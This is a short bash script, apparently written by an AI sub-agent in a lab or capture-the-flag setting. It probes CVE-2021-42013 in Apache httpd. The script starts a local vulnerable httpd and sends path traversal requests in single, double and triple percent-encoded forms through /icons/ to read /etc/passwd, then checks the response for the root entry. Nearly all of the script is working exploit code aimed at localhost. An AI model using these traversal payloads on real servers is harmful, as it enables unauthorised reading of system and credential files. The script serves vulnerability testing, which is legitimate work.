#!/bin/bash
# 子智能体 A：CVE-2021-42013 快速探测（两种编码形态）
set -u
ROOT="/mnt/e/强网拟态/cve/apache"
RT=/tmp/apacheA/42013
PREFIX=/opt/httpd
mkdir -p "$RT"
rm -f "$RT"/*
python3 - <<'EOF'
import socket
for p in (8090, 8091):
    s = socket.socket(); s.settimeout(0.2)
    try:
        s.connect(("127.0.0.1", p)); print("PORT %d BUSY" % p)
    except Exception:
        print("PORT %d free" % p)
    s.close()
EOF
setsid "$PREFIX/bin/httpd" -f "$ROOT/conf/CVE-2021-42013.conf" -DFOREGROUND >"$RT/console.log" 2>&1 &
HPID=$!
echo "httpd pid=$HPID"
sleep 0.8
BASE="http://127.0.0.1:8090"
for label in single double triple; do
  case $label in
    single) URL="$BASE/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd" ;;
    double) URL="$BASE/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd" ;;
    triple) URL="$BASE/icons/.%%%32%65/.%%%32%65/.%%%32%65/.%%%32%65/etc/passwd" ;;
  esac
  echo "== $label: $URL =="
  curl -sS -i --path-as-is "$URL" > "$RT/$label.txt" 2>&1
  head -c 400 "$RT/$label.txt"; echo
  grep -c 'root:x:0:0' "$RT/$label.txt" || true
done
echo "== control normal alias =="
curl -sS -i --path-as-is "$BASE/icons/README" > "$RT/control.txt" 2>&1; head -5 "$RT/control.txt"
echo "== access_log =="; cat "$RT/access_log"
echo "== error_log =="; cat "$RT/error_log"
kill -TERM -- -"$HPID" 2>/dev/null || kill -TERM "$HPID" 2>/dev/null
sleep 0.5
ps -ef | grep "$PREFIX/bin/httpd" | grep -v grep || true
